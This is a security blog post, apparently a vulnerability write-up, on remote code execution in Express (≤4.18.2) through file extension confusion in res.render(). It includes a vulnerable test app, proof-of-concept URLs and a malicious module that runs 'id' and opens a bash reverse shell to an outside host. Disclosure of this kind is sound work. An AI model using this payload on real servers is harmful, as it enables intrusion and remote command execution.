    <span class="nf">debug</span><span class="p">(</span><span class="dl">'</span><span class="s1">require "%s"</span><span class="dl">'</span><span class="p">,</span> <span class="nx">mod</span><span class="p">)</span>

    <span class="c1">// default engine export</span>
    <span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="nx">mod</span><span class="p">).</span><span class="nx">__express</span>

    <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">fn</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Module "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">mod</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" does not provide a view engine.</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">opts</span><span class="p">.</span><span class="nx">engines</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">]</span> <span class="o">=</span> <span class="nx">fn</span>
  <span class="p">}</span>

  <span class="c1">// store loaded engine</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">engine</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">engines</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">];</span>

  <span class="c1">// lookup path</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">lookup</span><span class="p">(</span><span class="nx">fileName</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The <code class="language-plaintext highlighter-rouge">View()</code> function makes an anonymous function. In some if statement, if the <code class="language-plaintext highlighter-rouge">!opts.engines[this.ext]</code> property is empty, after cutting the first letter from the value of this.ext, the value is used to call the <code class="language-plaintext highlighter-rouge">require()</code> function. At this time, the function code called <code class="language-plaintext highlighter-rouge">__express</code> in the JavaScript file is imported and defined in <code class="language-plaintext highlighter-rouge">opts.engines[this.ext]</code>. Then, define the value of <code class="language-plaintext highlighter-rouge">opts.engines[this.ext]</code> in this.engine variable. That is, the this.engine variable contains the <code class="language-plaintext highlighter-rouge">__express</code> function.</p>

<p><a href="https://user-images.githubusercontent.com/49112423/208300163-99402ac8-17a0-43c5-8f73-75000bf06545.png" class="popup img-link  shimmer"><img src="https://user-images.githubusercontent.com/49112423/208300163-99402ac8-17a0-43c5-8f73-75000bf06545.png" alt="" loading="lazy"></a></p>

<p>This is where the root cause of this vulnerability occurs. After parsing the extension using <code class="language-plaintext highlighter-rouge">path.extname()</code>, it does not check the extension. That’s all.</p>

<h2 id="libapplicationjsl655l661"><span class="me-2">/lib/application.js#L655L661</span><a href="#libapplicationjsl655l661" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">tryRender</span><span class="p">(</span><span class="nx">view</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="nx">view</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">callback</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In the <code class="language-plaintext highlighter-rouge">render()</code> function, call the <code class="language-plaintext highlighter-rouge">tryRender()</code> function after calling the <code class="language-plaintext highlighter-rouge">View()</code> function. The <code class="language-plaintext highlighter-rouge">tryRender()</code> function calls the <code class="language-plaintext highlighter-rouge">View.prototype.render()</code> function</p>

<h2 id="libviewjsl133l136"><span class="me-2">/lib/view.js#L133L136</span><a href="#libviewjsl133l136" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nx">View</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">render</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
  <span class="nf">debug</span><span class="p">(</span><span class="dl">'</span><span class="s1">render "%s"</span><span class="dl">'</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">path</span><span class="p">);</span>
  <span class="k">this</span><span class="p">.</span><span class="nf">engine</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="nx">options</span><span class="p">,</span> <span class="nx">callback</span><span class="p">);</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Lastly, in the <code class="language-plaintext highlighter-rouge">View.prototype.render()</code> function, the anonymous function <code class="language-plaintext highlighter-rouge">this.engine()</code> function is executed.</p>

<hr />
<h1 id="how-to-trigger-an-rce">How to trigger an RCE</h1>

<h2 id="code-for-testing"><span class="me-2">Code for Testing</span><a href="#code-for-testing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">page</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">filename</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="nx">page</span><span class="p">);</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The test code is as above.</p>

<h2 id="check-ejs-extension-management-logic"><span class="me-2">Check ejs extension management logic</span><a href="#check-ejs-extension-management-logic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>![https://media.discordapp.net/attachments/1049498153801502740/1053999809608044574/2022-12-18_20.38.48.png?width=1550&amp;height=977]</p>

<ul>
  <li>http://localhost:3000/?filename=test</li>
  <li>http://localhost:3000/?filename=test.ejs</li>
</ul>

<p>I checked how the extension is managed in the logic that handles the extension of the file passed to the <code class="language-plaintext highlighter-rouge">render()</code> function. When I pass files like <code class="language-plaintext highlighter-rouge">render(‘test’)</code>, <code class="language-plaintext highlighter-rouge">render(‘test.ejs’)</code>, all extensions are ejs .</p>

<p><a href="https://media.discordapp.net/attachments/1049498153801502740/1054001435366395904/2022-12-18_20.45.13.png?width=1550&amp;height=977" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1049498153801502740/1054001435366395904/2022-12-18_20.45.13.png?width=1550&amp;height=977" alt="" loading="lazy"></a></p>

<ul>
  <li>http://localhost:3000/?filename=rce.pocas</li>
</ul>

<p>However, when the <code class="language-plaintext highlighter-rouge">render()</code> function is called like <code class="language-plaintext highlighter-rouge">render(‘rce.pocas’)</code>, <code class="language-plaintext highlighter-rouge">“pocas”</code>, not <code class="language-plaintext highlighter-rouge">“ejs”</code>, is included in the extension. Since the engine type was set to <code class="language-plaintext highlighter-rouge">“ejs”</code> using <code class="language-plaintext highlighter-rouge">app.set()</code> in express, the extension should be ejs in any case, but an arbitrary extension can be inserted because there is no exception handling.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">mod</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">ext</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">debug</span><span class="p">(</span><span class="dl">'</span><span class="s1">require "%s"</span><span class="dl">'</span><span class="p">,</span> <span class="nx">mod</span><span class="p">)</span>

<span class="c1">// default engine export</span>
<span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="nx">mod</span><span class="p">).</span><span class="nx">__express</span>
</pre></td></tr></tbody></table></code></div></div>

<p>That is, I can manipulate the extension and call the JavaScript library I want through the code above! Through the above function, get the <code class="language-plaintext highlighter-rouge">__express</code> function of the desired file, put it in this.engine variable, and execute <code class="language-plaintext highlighter-rouge">this.engine()</code> in <code class="language-plaintext highlighter-rouge">view.prototype.render()</code> function. If a hacker can upload a desired file under node_modules using the file upload function, the desired function code can be inserted into this.engine variable and executed.</p>

<h2 id="exploit"><span class="me-2">Exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="https://media.discordapp.net/attachments/1049498153801502740/1054003691281203230/2022-12-18_20.54.16.png" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1049498153801502740/1054003691281203230/2022-12-18_20.54.16.png" alt="" loading="lazy"></a></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nx">exports</span><span class="p">.</span><span class="nx">__express</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">).</span><span class="nf">toString</span><span class="p">());</span>
    <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">"</span><span class="s2">bash -c 'bash -i &gt;&amp; /dev/tcp/pocas.kr/9999 0&gt;&amp;1'</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>For the test, a module called pocas was created under node_modules.</p>

<p><a href="https://media.discordapp.net/attachments/1049498153801502740/1054009708169662464/2022-12-18_21.18.07.png?width=1550&amp;height=977" class="popup img-link  shimmer"><img src="https://media.discordapp.net/attachments/1049498153801502740/1054009708169662464/2022-12-18_21.18.07.png?width=1550&amp;height=977" alt="" loading="lazy"></a></p>

<ul>
  <li>http://localhost:3000/?filename=rce.pocas</li>
</ul>

<p>As shown above, you can see that RCE is triggered by calling an arbitrary library using the extension confusing.</p>

<hr />
<h1 id="mitigation">Mitigation</h1>

<p>The reason why the vulnerability occurs is that the file extension is parsed using the <code class="language-plaintext highlighter-rouge">path.extname()</code> function and the extension is not checked. Since the file extension is not checked, other arbitrary modules other than the ejs module can be called. So add file extension checking logic.</p>

<p>:Recommendation: compare whether the extension obtained through <code class="language-plaintext highlighter-rouge">extname()</code> and the extension of the server’s default template are the same</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Express,%20RCE%20via%20File%20Extension%20Confusing%20%E2%89%A4%20V4.18.2%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRCE-Express-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Express,%20RCE%20via%20File%20Extension%20Confusing%20%E2%89%A4%20V4.18.2%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRCE-Express-1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FRCE-Express-1%2F&text=Express,%20RCE%20via%20File%20Extension%20Confusing%20%E2%89%A4%20V4.18.2%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Logic-req.query/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Express, Querystring parameter limit of req.query</p>
    </a>
  

  
    <a
      href="/posts/b01lers/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>b01lers CTF 2023 Write Up</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/microsoft/">Microsoft</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

